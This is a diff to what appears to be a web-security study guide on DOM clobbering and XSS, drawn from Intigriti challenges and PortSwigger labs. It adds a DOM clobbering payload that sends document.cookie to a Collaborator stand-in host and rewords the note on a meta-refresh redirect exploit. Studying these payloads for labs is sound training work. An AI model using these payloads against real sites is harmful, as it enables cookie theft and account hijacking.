@@ -736,7 +736,7 @@ body:document.cookie
 <input form=comment-form name=tags value='a");alert(document.getElementsByClassName("navbar-brand")[0].innerText)//'>
 ```  
 
->This target is exploited by constructing an HTML injection that clobbers a variable named `share_button`, see `source code` below and uses XSS code above. The content is reflected on the page, then using `meta http-equiv` tag to refresh page after 1 second result in redirecting to `/edit`.  
+>This target is exploited by constructing an HTML injection that clobbers a variable named `share_button`, see `source code` below and uses HTML code above. The content is reflected on the page, then using this reflection enable page redirection to victim `/edit` page with the use of the `meta http-equiv` tag to refresh page after 1 second result in redirection.  
 
 ![clobbering javascript variable](images/clobbering5.png)  
 
@@ -758,6 +758,12 @@ https://challenge-1222.intigriti.io/blog/unique-guid-value-abc123?share=1
 
 ```
 alert(document.getElementsByClassName("navbar-brand")[0].innerText)
+```  
+
+>The modified PortSwigger lab payload assign the `document.location` function to the variable `defaultAvatar` next time page is loaded, because site uses DOMPurify that allows the use of `cid:` protocol that do not URLencode double quotes.  
+
+```
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=document.location=`https://COLLABORATOR.com/?clobber=`+document.cookie//">
 ```  
 
 [PortSwigger Lab: Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)  
